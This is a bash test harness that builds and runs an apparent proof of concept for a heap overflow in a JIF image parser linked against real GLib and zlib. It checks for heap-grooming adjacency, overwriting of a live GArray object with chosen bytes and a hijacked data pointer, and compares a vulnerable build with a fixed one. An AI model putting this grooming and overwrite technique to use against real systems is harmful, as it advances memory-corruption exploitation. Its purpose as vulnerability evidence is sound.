#!/usr/bin/env bash
# Rebuild and exercise the verbatim JIF pin against REAL glib + REAL zlib.
# Evidence: adjacent live GLib object corruption, vulnerable vs fixed vs safe.
set -u
cd "$(dirname "$0")"
mkdir -p evidence

GLIB_CFLAGS=$(pkg-config --cflags glib-2.0)
GLIB_LIBS=$(pkg-config --libs glib-2.0)
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -q -- "$2" "$1" 2>/dev/null; }

echo "== build (real glib $(pkg-config --modversion glib-2.0), real zlib $(dpkg-query -W -f='${Version}' zlib1g 2>/dev/null || echo unknown)) =="
gcc -O0 -g -Wall -I. $GLIB_CFLAGS -o evidence/real-vuln real-driver.c $GLIB_LIBS -lz && ok "real glib vulnerable build" || bad "real glib vulnerable build"
gcc -O0 -g -Wall -I. $GLIB_CFLAGS -DVARIANT_FIXED -o evidence/real-fixed real-driver.c $GLIB_LIBS -lz && ok "real glib fixed build" || bad "real glib fixed build"

echo "== runs =="
evidence/real-vuln attack 4d > evidence/vuln-attack-4d.log 2>&1
evidence/real-vuln attack 41 > evidence/vuln-attack-41.log 2>&1
evidence/real-vuln safe  4d > evidence/vuln-safe.log 2>&1
evidence/real-fixed attack 4d > evidence/fixed-attack.log 2>&1
evidence/real-vuln ptr  4d > evidence/vuln-ptr.log 2>&1
evidence/real-fixed ptr  4d > evidence/fixed-ptr.log 2>&1

echo "== real allocator adjacency =="
has evidence/vuln-attack-4d.log "delta=272" && ok "live GArray control struct exactly 272 bytes after groom chunk" || bad "live GArray control struct exactly 272 bytes after groom chunk"
has evidence/vuln-attack-4d.log "usable=264" && ok "glibc usable size 264 for 260-byte request" || bad "glibc usable size 264 for 260-byte request"

echo "== vulnerable: chosen bytes in adjacent live GLib object =="
has evidence/vuln-attack-4d.log "LIVE_AFTER=4d4d4d4d" && ok "chosen 0x4d bytes in live object" || bad "chosen 0x4d bytes in live object"
has evidence/vuln-attack-41.log "LIVE_AFTER=41414141" && ok "chosen 0x41 bytes in live object" || bad "chosen 0x41 bytes in live object"
has evidence/vuln-attack-4d.log "LIVE_CHANGED_BYTES=48" && ok "all 48 live GArray control-struct bytes overwritten" || bad "all 48 live GArray control-struct bytes overwritten"

echo "== chosen address in live object's pointer field (no dereference) =="
has evidence/vuln-ptr.log "PTR_MATCH=1" && ok "live GArray data pointer set to chosen valid address" || bad "live GArray data pointer set to chosen valid address"
has evidence/fixed-ptr.log "PTR_MATCH=0" && ok "fixed build leaves live pointer field intact" || bad "fixed build leaves live pointer field intact"

echo "== fixed and safe-input controls =="
has evidence/fixed-attack.log "RC=0 ERR=image data" && ok "fixed build rejects wrapped size" || bad "fixed build rejects wrapped size"
has evidence/fixed-attack.log "LIVE_CHANGED_BYTES=0" && ok "fixed build leaves live object intact" || bad "fixed build leaves live object intact"
has evidence/vuln-safe.log "RC=1" && ok "vulnerable build accepts safe JIF" || bad "vulnerable build accepts safe JIF"
has evidence/vuln-safe.log "LIVE_CHANGED_BYTES=0" && ok "safe input leaves live object intact" || bad "safe input leaves live object intact"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
